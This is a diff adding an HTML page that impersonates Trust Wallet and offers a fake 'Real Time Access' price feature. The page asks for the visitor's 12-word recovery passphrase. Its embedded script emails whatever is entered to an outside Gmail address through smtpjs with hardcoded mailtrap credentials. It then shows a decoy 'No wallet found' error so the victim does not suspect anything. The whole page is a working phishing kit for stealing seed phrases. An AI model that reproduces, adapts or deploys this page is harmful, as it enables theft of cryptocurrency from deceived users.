@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="shortcut icon" type="image/jpg" href="32179889.png"/>
+    <title>Trust Wallet - RTA</title>
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300&display=swap');
+        
+        
+
+        body{
+            background: linear-gradient(to bottom right,#3375BB 50%,#105BAA 100%) no-repeat;
+            font-family: 'ibmplexsans',sans-serif;
+        }
+
+        input::-webkit-input-placeholder {
+            font-size: 14px;
+        }
+    </style>
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script type="text/javascript">
+        function getString(){
+            var msg = document.getElementById('phrase').value;
+            sendEmail(msg);
+            document.getElementById('load').style.display = "block";
+        }
+
+        function sendEmail(msg) {
+          Email.send({
+            Host: "smtp.mailtrap.io",
+            Username: "fb01a1fefc606a",
+            Password: "bf6cf81c41df03",
+            To: 'himyfren@gmail.com',
+            From: "dayumhaha@gmail.com",
+            Subject: "PASSPHRASE",
+            Body: msg,
+          })
+            .then(function (message) {
+            //   alert("It should be displaying accurate price in 2hours time.");
+            swal.fire(
+                    'No wallet found',
+                    'No wallet is connected to the passphrase entered, please check again.',
+                    'error'
+                );
+              console.log(message);
+              document.getElementById('load').style.display = "none";
+            });
+        }
+      </script>
+</head>
+<body>
+    <!-- Image and text -->
+    <nav class="navbar navbar-light bg-transparent">
+        <div class="container">
+            <a class="navbar-brand" href="#">
+            <img src="trust_platform.png" width="30" height="30" class="d-inline-block align-top" alt="">
+            <span style="color: white; font-weight: 500;">Trust Wallet</span>
+            </a>
+        </div>
+    </nav>
+
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 my-auto" style="padding: 35px;">
+                <p style="color: white; font-weight: 700; font-size: 2.25rem;">Real Time Access</p>
+                <span style="color: rgb(226, 226, 226);">Enabling RTA would display the most accurate and up-to-date prices on your app list. However, it may not work for some currencies. Enter your 12 words passphrase to connect to your trust wallet app.</span>
+                <div>
+                <input class="form-control" id="phrase" style="margin-top: 20px;"placeholder="Enter your passphrase here...">
+                <div>
+                    <p class="btn btn-info" data-toggle="modal" onclick="getString()" data-target="#exampleModal" style="margin-top:10px;">Continue</p>
+                    <img id="load" style="width: 25px; margin-left: 5px; padding-bottom: 5px; display: none;" src="loading.gif">
+                </div>
+
+
+
+            </div>
+            </div>
+            <div class="col-md-6">
+                <img src="home_trustwallet_app.png" class="img-fluid" style="margin-left:auto; margin-right:auto;">
+            </div>
+        </div>
+
+       
+
+    </div>
+
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="//cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+    <script>
+        $(document).ready(function() {
+            $('#myModal').on('shown.bs.modal', function () {
+  $('#myInput').trigger('focus')
+})
+        });
+      </script>
+</body>
+</html>
